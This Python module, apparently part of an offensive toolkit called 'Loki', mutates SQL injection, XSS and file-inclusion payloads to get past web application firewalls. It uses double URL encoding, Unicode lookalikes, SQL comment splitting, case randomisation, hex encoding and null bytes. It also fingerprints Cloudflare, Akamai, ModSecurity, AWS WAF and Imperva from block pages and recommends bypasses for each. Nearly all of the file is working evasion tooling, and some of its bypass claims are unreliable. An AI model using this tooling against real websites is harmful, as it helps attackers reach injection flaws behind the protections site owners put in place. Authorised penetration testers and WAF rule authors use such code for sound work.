"""
Loki — WAF Evader & Payload Mutator
The trickster god of shapeshifting. Dynamically mutates SQLi/XSS payloads
using double encoding, unicode distortion, comment injection, and more
to evade Web Application Firewalls (WAFs).
Also analyzes HTTP error responses (403/406) to suggest bypass strategies.
"""
import re
import random
import urllib.parse
TECHNIQUES = {
    "url_double": {
        "name": "Double URL Encoding",
        "description": "Encodes special chars twice: ' → %2527, bypasses single-decode WAFs",
        "category": "encoding",
        "target": ["sqli", "xss", "lfi", "rce", "all"]
    },
    "unicode_bypass": {
        "name": "Unicode Normalization Bypass",
        "description": "Uses Unicode lookalikes and fullwidth chars to evade pattern matching",
        "category": "encoding",
        "target": ["sqli", "xss", "lfi", "all"]
    },
    "comment_injection": {
        "name": "SQL Comment Injection",
        "description": "Inserts /**/ between SQL keywords: SELECT → SEL/**/ECT",
        "category": "sql",
        "target": ["sqli"]
    },
    "html_entity": {
        "name": "HTML Entity Encoding",
        "description": "Encodes XSS payload chars as HTML entities: < → &#x3C;",
        "category": "encoding",
        "target": ["xss"]
    },
    "case_randomize": {
        "name": "Case Randomization",
        "description": "Randomizes character case: SeLeCt, <ScRiPt>",
        "category": "obfuscation",
        "target": ["sqli", "xss", "all"]
    },
    "hex_encode": {
        "name": "Hex Encoding (SQL)",
        "description": "Converts SQL strings to hex: ' OR 1=1 → 0x27204f5220313d31",
        "category": "encoding",
        "target": ["sqli"]
    },
    "whitespace_swap": {
        "name": "Whitespace Manipulation",
        "description": "Replaces spaces with /**/, +, %09, %0a, %0d to evade space filters",
        "category": "obfuscation",
        "target": ["sqli", "all"]
    },
    "null_byte": {
        "name": "Null Byte Injection",
        "description": "Inserts %00 before payload to terminate WAF string parsing early",
        "category": "obfuscation",
        "target": ["sqli", "lfi", "all"]
    },
    "mixed_encoding": {
        "name": "Mixed Encoding",
        "description": "Applies URL encoding to random chars in the payload",
        "category": "encoding",
        "target": ["sqli", "xss", "lfi", "all"]
    },
    "tab_newline": {
        "name": "Tab/Newline Injection",
        "description": "Inserts %09, %0a, %0d between keywords to evade regex patterns",
        "category": "obfuscation",
        "target": ["sqli", "all"]
    },
}
def _url_double_encode(payload):
    """Double URL-encode the payload."""
    single = urllib.parse.quote(payload, safe='')
    return urllib.parse.quote(single, safe='')
def _unicode_bypass(payload):
    """Replace ASCII chars with Unicode lookalikes."""
    unicode_map = {
        "'": "%uff07", '"': "%uff02", "<": "%uff1c", ">": "%uff1e",
        " ": "%uff00", "=": "%uff1d", "(": "%uff08", ")": "%uff09",
        "/": "%uff0f", "*": "%uff0a", ";": "%uff1b", ":": "%uff1a",
        ".": "%uff0e", "-": "%uff0d", "_": "%uff3f",
    }
    result = payload
    for char, replacement in unicode_map.items():
        if random.random() > 0.4:
            result = result.replace(char, replacement)
    return result
def _comment_injection(payload):
    """Insert /**/ comments into SQL keywords."""
    sql_keywords = [
        "SELECT", "UNION", "WHERE", "FROM", "AND", "OR", "ORDER", "BY",
        "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "TABLE", "HAVING",
        "GROUP", "JOIN", "INTO", "VALUES", "SET", "LIMIT", "OFFSET",
        "WAITFOR", "DELAY", "SLEEP", "BENCHMARK",
    ]
    result = payload
    for kw in sorted(sql_keywords, key=len, reverse=True):
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        if pattern.search(result):
            mid = len(kw) // 2
            mutated = kw[:mid] + "/**/" + kw[mid:]
            result = pattern.sub(mutated, result, count=1)
    return result
def _html_entity_encode(payload):
    """Encode XSS-relevant chars as HTML entities."""
    entity_map = {
        "<": "&#x3C;", ">": "&#x3E;", '"': "&#x22;", "'": "&#x27;",
        "&": "&#x26;", "=": "&#x3D;", "/": "&#x2F;", "(": "&#x28;", ")": "&#x29;",
    }
    result = payload
    for char, entity in entity_map.items():
        result = result.replace(char, entity)
    return result
def _case_randomize(payload):
    """Randomize character casing in the payload."""
    result = []
    for ch in payload:
        if ch.isalpha() and random.random() > 0.3:
            result.append(ch.upper() if ch.islower() else ch.lower())
        else:
            result.append(ch)
    return ''.join(result)
def _hex_encode_sql(payload):
    """Hex-encode SQL string literals."""
    def hex_replace(m):
        s = m.group(1)
        return "0x" + s.encode().hex()
    return re.sub(r"'([^']*)'", hex_replace, payload)
def _whitespace_swap(payload):
    """Replace spaces with SQL-compatible alternatives."""
    alternatives = ["/**/", "+", "%09", "%0a", "%0d", "/*!50000*/"]
    return payload.replace(" ", random.choice(alternatives))
def _null_byte_inject(payload):
    """Prepend null byte to terminate early WAF parsing."""
    return "%00" + payload
def _mixed_encoding(payload):
    """URL-encode random characters in the payload."""
    result = []
    for ch in payload:
        if ch.isalnum() and random.random() > 0.5:
            result.append("%" + format(ord(ch), '02x'))
        else:
            result.append(ch)
    return ''.join(result)
def _tab_newline_inject(payload):
    """Insert tab/newline chars around SQL keywords."""
    tokens = [" ", "=", "(", ")", ",", ";"]
    result = payload
    for t in tokens:
        if random.random() > 0.5:
            inject = random.choice(["%09", "%0a", "%0d"])
            result = result.replace(t, inject + t)
    return result
_MUTATION_FUNCTIONS = {
    "url_double": _url_double_encode,
    "unicode_bypass": _unicode_bypass,
    "comment_injection": _comment_injection,
    "html_entity": _html_entity_encode,
    "case_randomize": _case_randomize,
    "hex_encode": _hex_encode_sql,
    "whitespace_swap": _whitespace_swap,
    "null_byte": _null_byte_inject,
    "mixed_encoding": _mixed_encoding,
    "tab_newline": _tab_newline_inject,
}
def mutate_payload(payload, techniques=None, count=5):
    """
    Apply WAF evasion mutations to a payload.
    Args:
        payload: str — the original payload (SQLi, XSS, LFI, etc.)
        techniques: list — technique keys to apply (default: all applicable)
        count: int — number of unique mutated variants to return
    Returns:
        dict with original payload and list of mutated variants
    """
    if not payload or not payload.strip():
        return {"status": "error", "message": "Payload is required."}
    payload = payload.strip()
    if techniques is None:
        techniques = list(_MUTATION_FUNCTIONS.keys())
    results = []
    seen = {payload}
    for tech in techniques[:10]:
        if tech not in _MUTATION_FUNCTIONS:
            continue
        try:
            fn = _MUTATION_FUNCTIONS[tech]
            mutated = fn(payload)
            if mutated and mutated != payload and mutated not in seen:
                seen.add(mutated)
                results.append({
                    "payload": mutated,
                    "technique": tech,
                    "name": TECHNIQUES.get(tech, {}).get("name", tech),
                    "category": TECHNIQUES.get(tech, {}).get("category", "unknown"),
                })
        except Exception:
            continue
    for _ in range(min(count // 2, 5)):
        if len(techniques) >= 2:
            t1, t2 = random.sample(techniques, 2)
            try:
                intermediate = _MUTATION_FUNCTIONS[t1](payload)
                mutated = _MUTATION_FUNCTIONS[t2](intermediate)
                if mutated and mutated != payload and mutated not in seen:
                    seen.add(mutated)
                    results.append({
                        "payload": mutated,
                        "technique": f"{t1}+{t2}",
                        "name": f"{TECHNIQUES.get(t1, {}).get('name', t1)} + {TECHNIQUES.get(t2, {}).get('name', t2)}",
                        "category": "combo",
                    })
            except Exception:
                continue
    return {
        "status": "success",
        "original": payload,
        "mutations": results[:count],
        "total_generated": len(results),
        "techniques_used": list(set(r["technique"] for r in results)),
    }
def list_techniques():
    """Return all available mutation techniques with metadata."""
    return {
        "status": "success",
        "techniques": [
            {"key": k, "name": v["name"], "description": v["description"],
             "category": v["category"], "target": v["target"]}
            for k, v in TECHNIQUES.items()
        ]
    }
def analyze_waf_response(status_code, response_body=""):
    """
    Analyze a WAF block response and suggest bypass strategies.
    Args:
        status_code: int — HTTP status code (403, 406, 429, etc.)
        response_body: str — optional response body for fingerprinting
    Returns:
        dict with WAF analysis and recommended techniques
    """
    code = int(status_code)
    analysis = {
        "status_code": code,
        "likely_waf": "Unknown",
        "block_type": "generic",
        "suggestions": [],
    }
    body_lower = response_body.lower()
    if code == 403:
        analysis["block_type"] = "forbidden"
        if "cloudflare" in body_lower or "cf-ray" in body_lower:
            analysis["likely_waf"] = "Cloudflare"
            analysis["suggestions"] = [
                {"technique": "unicode_bypass", "reason": "Cloudflare normalizes Unicode; use lookalikes"},
                {"technique": "case_randomize", "reason": "Evade Cloudflare's case-sensitive SQLi patterns"},
                {"technique": "mixed_encoding", "reason": "Random encoding bypasses Cloudflare's signature matching"},
            ]
        elif "akamai" in body_lower or "akam" in body_lower:
            analysis["likely_waf"] = "Akamai"
            analysis["suggestions"] = [
                {"technique": "tab_newline", "reason": "Akamai often misses tab/newline injected payloads"},
                {"technique": "comment_injection", "reason": "SQL comments fragment the signature"},
                {"technique": "null_byte", "reason": "Null byte may terminate Akamai's parser early"},
            ]
        elif "mod_security" in body_lower or "modsecurity" in body_lower:
            analysis["likely_waf"] = "ModSecurity"
            analysis["suggestions"] = [
                {"technique": "url_double", "reason": "ModSecurity may only decode once"},
                {"technique": "unicode_bypass", "reason": "Unicode chars bypass ModSecurity regex rules"},
                {"technique": "whitespace_swap", "reason": "Space alternatives evade basic regex patterns"},
            ]
        elif "aws" in body_lower or "waf" in body_lower:
            analysis["likely_waf"] = "AWS WAF"
            analysis["suggestions"] = [
                {"technique": "mixed_encoding", "reason": "AWS WAF rate-limits but encoding evades signatures"},
                {"technique": "comment_injection", "reason": "Comment injection breaks AWS SQLi rules"},
                {"technique": "hex_encode", "reason": "Hex encoding bypasses AWS string matching"},
            ]
        elif "imperva" in body_lower or "incapsula" in body_lower:
            analysis["likely_waf"] = "Imperva / Incapsula"
            analysis["suggestions"] = [
                {"technique": "html_entity", "reason": "HTML entities pass through Imperva XSS filters"},
                {"technique": "case_randomize", "reason": "Random case evades Imperva's keyword matching"},
            ]
        else:
            analysis["likely_waf"] = "Generic WAF (403 Forbidden)"
            analysis["suggestions"] = [
                {"technique": "url_double", "reason": "Double encoding is the most universal bypass"},
                {"technique": "unicode_bypass", "reason": "Unicode lookalikes evade most regex-based filters"},
                {"technique": "case_randomize", "reason": "Case randomization breaks naive pattern matching"},
                {"technique": "comment_injection", "reason": "SQL comments fragment detection signatures"},
            ]
    elif code == 406:
        analysis["block_type"] = "not_acceptable"
        analysis["likely_waf"] = "Content-Type Filtering WAF"
        analysis["suggestions"] = [
            {"technique": "mixed_encoding", "reason": "Encoding may allow payload through content checks"},
            {"technique": "unicode_bypass", "reason": "Unicode may pass content-type validation"},
        ]
    elif code == 429:
        analysis["block_type"] = "rate_limit"
        analysis["likely_waf"] = "Rate-Limiting WAF"
        analysis["suggestions"] = [
            {"technique": "mixed_encoding", "reason": "Slow down and use varied payloads to stay under threshold"},
        ]
    else:
        analysis["block_type"] = f"http_{code}"
        analysis["suggestions"] = [
            {"technique": "url_double", "reason": "Try universal encoding bypasses"},
            {"technique": "unicode_bypass", "reason": "Unicode bypass is effective against most WAFs"},
        ]
    analysis["all_techniques"] = list(TECHNIQUES.keys())
    return {"status": "success", "analysis": analysis}
